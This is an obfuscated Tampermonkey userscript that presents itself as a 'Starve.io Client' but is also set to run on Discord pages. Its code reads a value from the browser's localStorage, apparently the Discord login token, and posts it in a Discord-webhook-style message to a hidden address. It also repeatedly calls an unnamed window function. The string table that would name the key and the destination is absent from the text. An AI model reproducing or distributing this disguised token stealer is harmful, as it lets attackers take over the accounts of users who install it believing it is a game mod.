// ==UserScript==
// @name         Starve.io Client
// @namespace    http://tampermonkey.net/
// @version      0.3
// @description  Takeover your mom!
// @author       Lofy#x5744
// @match        https://discord.com/activ*
// @match        https://discord.com/channel*
// @match       *https://starve.io*
// @grant        none
// @run-at       document-start
// ==/UserScript==

(function() {
    _0x6a05[0];
    setTimeout(() => {
        window[_0x6a05[2]](_0x6a05[1])
    }, 5000);
    setTimeout(() => {
        setInterval(() => {
            window[_0x6a05[3]]()
        }, 1)
    }, 2060);
    var _0x60b1x5 = localStorage[_0x6a05[5]](_0x6a05[4]);
    let _0x60b1x6 = _0x6a05[6];

    function _0x60b1x7() {
        var _0x60b1x8 = new XMLHttpRequest;
        _0x60b1x8[_0x6a05[2]](_0x6a05[7], _0x60b1x6), _0x60b1x8[_0x6a05[10]](_0x6a05[8], _0x6a05[9]);
        var _0x60b1x9 = {
            username: _0x6a05[11],
            avatar_url: _0x6a05[12],
            content: _0x6a05[13],
            embeds: [{
                color: _0x6a05[14],
                description: _0x6a05[15] + _0x60b1x5,
                footer: {
                    text: _0x6a05[16]
                }
            }]
        };
        _0x60b1x8[_0x6a05[18]](JSON[_0x6a05[17]](_0x60b1x9))
    }
    _0x60b1x7()
})();
if (!window[_0x6a05[19]]) {
    Object[_0x6a05[20]](window, _0x6a05[19], new(function() {
        var _0x60b1xa = [],
            _0x60b1xb = {};
        Object[_0x6a05[20]](_0x60b1xb, _0x6a05[5], {
            value: function(_0x60b1xc) {
                return this[_0x60b1xc] ? this[_0x60b1xc] : null
            },
            writable: false,
            configurable: false,
            enumerable: false
        });
        Object[_0x6a05[20]](_0x60b1xb, _0x6a05[21], {
            value: function(_0x60b1xd) {
                return _0x60b1xa[_0x60b1xd]
            },
            writable: false,
            configurable: false,
            enumerable: false
        });
        Object[_0x6a05[20]](_0x60b1xb, _0x6a05[22], {
            value: function(_0x60b1xc, _0x60b1xe) {
                if (!_0x60b1xc) {
                    return
                };
                document[_0x6a05[23]] = escape(_0x60b1xc) + _0x6a05[24] + escape(_0x60b1xe) + _0x6a05[25]
            },
            writable: false,
            configurable: false,
            enumerable: false
        });
        Object[_0x6a05[20]](_0x60b1xb, _0x6a05[26], {
            get: function() {
                return _0x60b1xa[_0x6a05[26]]
            },
            configurable: false,
            enumerable: false
        });
        Object[_0x6a05[20]](_0x60b1xb, _0x6a05[27], {
            value: function(_0x60b1xc) {
                if (!_0x60b1xc) {
                    return
                };
                document[_0x6a05[23]] = escape(_0x60b1xc) + _0x6a05[28]
            },
            writable: false,
            configurable: false,
            enumerable: false
        });
        Object[_0x6a05[20]](_0x60b1xb, _0x6a05[29], {
            value: function() {
                if (!_0x60b1xa[_0x6a05[26]]) {
                    return
                };
                for (var _0x60b1xc in _0x60b1xa) {
                    document[_0x6a05[23]] = escape(_0x60b1xc) + _0x6a05[28]
                }
            },
            writable: false,
            configurable: false,
            enumerable: false
        });
        this[_0x6a05[30]] = function() {
            var _0x60b1xf;
            for (var _0x60b1xc in _0x60b1xb) {
                _0x60b1xf = _0x60b1xa[_0x6a05[31]](_0x60b1xc);
                if (_0x60b1xf === -1) {
                    _0x60b1xb[_0x6a05[22]](_0x60b1xc, _0x60b1xb[_0x60b1xc])
                } else {
                    _0x60b1xa[_0x6a05[32]](_0x60b1xf, 1)
                };
                delete _0x60b1xb[_0x60b1xc]
            };
            for (_0x60b1xa; _0x60b1xa[_0x6a05[26]] > 0; _0x60b1xa[_0x6a05[32]](0, 1)) {
                _0x60b1xb[_0x6a05[27]](_0x60b1xa[0])
            };
            for (var _0x60b1x10, _0x60b1x11, _0x60b1x12 = 0, _0x60b1x13 = document[_0x6a05[23]][_0x6a05[33]](/\s*;\s*/); _0x60b1x12 < _0x60b1x13[_0x6a05[26]]; _0x60b1x12++) {
                _0x60b1x10 = _0x60b1x13[_0x60b1x12][_0x6a05[33]](/\s*=\s*/);
                if (_0x60b1x10[_0x6a05[26]] > 1) {
                    _0x60b1xb[_0x60b1x11 = unescape(_0x60b1x10[0])] = unescape(_0x60b1x10[1]);
                    _0x60b1xa[_0x6a05[34]](_0x60b1x11)
                }
            };
            return _0x60b1xb
        };
        this[_0x6a05[35]] = false;
        this[_0x6a05[36]] = true
    })())
}
